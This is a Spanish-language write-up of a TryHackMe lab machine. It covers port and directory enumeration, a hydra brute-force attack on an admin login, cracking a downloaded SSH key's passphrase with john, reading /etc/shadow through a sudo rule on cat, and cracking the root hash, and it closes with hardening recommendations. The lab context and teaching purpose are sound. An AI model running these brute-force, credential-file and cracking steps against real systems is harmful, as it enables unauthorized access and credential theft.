## 1. Introducción

El presente informe detalla un análisis de seguridad ofensiva sobre una máquina Linux expuesta en el entorno de red TryHackMe, con IP 10.10.89.77. El objetivo fue identificar vectores de acceso inicial, explotación y escalada de privilegios con el fin de evaluar la resistencia del sistema ante ataques reales. El análisis se llevó a cabo bajo un enfoque Black Box, simulando a un atacante externo sin credenciales previas.
## 2. Escaneo Inicial
**Herramienta utilizada**: `nmap`
**Técnica empleada**:
- Escaneo completo de puertos TCP (`-sS -p-`)
```bash
nmap 10.10.89.77 -sS -p-       
Nmap scan report for 10.10.89.77 (10.10.89.77)
Host is up (0.18s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```
- Detección de versiones de servicios (`-sV`)
```bash 
nmap 10.10.89.77 -sV -p22,80
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-14 11:19 EDT
Nmap scan report for 10.10.89.77 (10.10.89.77)
Host is up (0.18s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
## 3. Enumeración
**Enumeración Web**:
- Herramienta: `Gobuster`
- Ruta descubierta: `/admin/` (redireccionamiento 301)
- Archivos protegidos: `.htaccess`, `.htpasswd`, etc. (403 Forbidden)
```bash
gobuster dir -u brute.thm -w /usr/share/seclists/Discovery/Web-Content/common.txt -x .php,.js
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://brute.thm
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,js
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 274]
/.hta.php             (Status: 403) [Size: 274]
/.htaccess            (Status: 403) [Size: 274]
/.hta.js              (Status: 403) [Size: 274]
/.htaccess.js         (Status: 403) [Size: 274]
/.htaccess.php        (Status: 403) [Size: 274]
/.htpasswd            (Status: 403) [Size: 274]
/.htpasswd.js         (Status: 403) [Size: 274]
/.htpasswd.php        (Status: 403) [Size: 274]
/admin                (Status: 301) [Size: 306] [--> http://brute.thm/admin/]
Progress: 2239 / 14205 (15.76%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 2256 / 14205 (15.88%)
===============================================================
Finished
===============================================================

```
Ingresamos a la pagina web de la ruta oculta y nos encontramos un login
![](Pasted%20image%2020250414110730.png)
**Análisis de código fuente del HTML**:
- Comentario revela nombre de usuario: `<!-- Hey john, if you do not remember, the username is admin -->`
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="styles.css">
    <title>Admin Login Page</title>
</head>
<body>
    <div class="main">
        <form action="" method="POST">
            <h1>LOGIN</h1>

            
            <p>Username or password invalid</p>

            
            <label>USERNAME</label>
            <input type="text" name="user">

            <label>PASSWORD</label>
            <input type="password" name="pass">

            <button type="submit">LOGIN</button>
        </form>
    </div>

    <!-- Hey john, if you do not remember, the username is admin -->
</body>
</html>

```
## 4. Explotación
**Técnica**: Ataque de fuerza bruta con `hydra` al formulario `/admin`
```bash
hydra -l admin -P rockyou.txt brute.thm http-post-form "/admin/:user=^USER^&pass=^PASS^:Username or password invalid"    
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-04-14 11:48:09
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking http-post-form://brute.thm:80/admin/:user=^USER^&pass=^PASS^:Username or password invalid
[80][http-post-form] host: brute.thm   login: admin   password: xavier
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-04-14 11:48:42
```
**Resultado**:  
Credenciales válidas: `admin:xavier`
**Acceso**: La página administradora permitía la descarga de un archivo `id_rsa` (clave privada SSH).
![](Pasted%20image%2020250414105241.png)
**Post-explotación inicial**:
1. Convertir clave a formato hash:
```bash
ssh2john id_rsa >id_rsa.hash   
```
2. Ataque con `john`:
``` bash
john id_rsa.hash --wordlist=../rockyou.txt

Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
rockinroll       (id_rsa)     
1g 0:00:00:00 DONE (2025-04-14 12:00) 50.00g/s 3630Kp/s 3630Kc/s 3630KC/s saline..rock07
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```
Resultado: `rockinroll` (passphrase de la clave)
Acceso SSH exitoso como el usuario `john`:
```bash
ssh -i id_rsa john@10.10.89.77
chmod 600 id_rsa

id_rsa john@10.10.89.77
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-118-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Apr 14 16:16:07 UTC 2025

  System load:  0.0                Processes:           104
  Usage of /:   25.7% of 19.56GB   Users logged in:     0
  Memory usage: 20%                IP address for eth0: 10.10.89.77
  Swap usage:   0%


63 packages can be updated.
0 updates are security updates.


Last login: Wed Sep 30 14:06:18 2020 from 192.168.1.106
john@bruteit:~$ 
john@bruteit:~$ ls
user.txt
john@bruteit:~$ cat user.txt
THM{****************************}

```
## 5. Escalada de Privilegios
**1. Verificación de privilegios sudo**:

```bash
john@bruteit:~$ sudo -l
Matching Defaults entries for john on bruteit:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User john may run the following commands on bruteit:
    (root) NOPASSWD: /bin/cat
```
**Resultado**:  
`john` puede ejecutar `/bin/cat` como root sin contraseña (`NOPASSWD`)
**2. Acceso a archivos sensibles**:
- `/etc/shadow` accedido y descargado
```bash
sudo /bin/cat /etc/shadow
[...]
thm:$6$hAlc6HXuBJHNjKzc$NPo/0/iuwh3.86PgaO97jTJJ/hmb0nPj8S/V6lZDsjUeszxFVZvuHsfcirm4zZ11IUqcoB9IEWYiCV.wcuzIZ.:18489:0:99999:7:::
sshd:*:18489:0:99999:7:::
john:$6$iODd0YaH$BA2G28eil/ZUZAV5uNaiNPE0Pa6XHWUFp7uNTp2mooxwa4UzhfC0kjpzPimy1slPNm9r/9soRw8KqrSgfDPfI0:18490:0:99999:7:::

```
- Hash del usuario root crackeado con `john`:
```
john hashes.txt --wordlist=../rockyou.txt

Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
football         (root)     
```
**3. Acceso Root**:
```
john@bruteit:~$ su -
Password: 
root@bruteit:~# ls
root.txt
root@bruteit:~# cat root.txt
THM{***************}

```
**4. Alternativa directa** (sin crackeo):
```
sudo /bin/cat /root/root.txt
THM{***************}
```
## 6. Hallazgos Clave

| Elemento          | Descripción                                       |
| ----------------- | ------------------------------------------------- |
| Credencial Web    | admin : xavier                                    |
| SSH Key           | Descargada desde panel web con passphrase         |
| Usuario SSH       | john (acceso remoto con clave privada)            |
| Escalada          | Sudoers permite `cat` como root (grave debilidad) |
| Contraseña root   | `football` (recuperada desde `/etc/shadow`)       |
| Flags encontradas | `user.txt` y `root.txt`                           |
## 7. Conclusión

Se logró comprometer completamente la máquina objetivo desde una superficie expuesta mínima (HTTP y SSH). La falta de políticas de seguridad adecuadas permitió una cadena de ataque simple y efectiva:

1. **Enumeración deficiente** en el servicio web expuso credenciales.
    
2. **Gestión inadecuada de claves SSH**, permitiendo acceso lateral.
    
3. **Permisos `sudo` mal configurados**, facilitando la escalada directa.
    
4. **Contraseña root débil**, crackeada con diccionario común.
    

**Recomendaciones**:

- Eliminar acceso `sudo` sin contraseña.
    
- Usar autenticación multifactor.
    
- Rotar contraseñas y claves privadas.
    
- Configurar IDS para detectar escaneos o fuerza bruta.
    
- Asegurar rutas administrativas con autenticación robusta.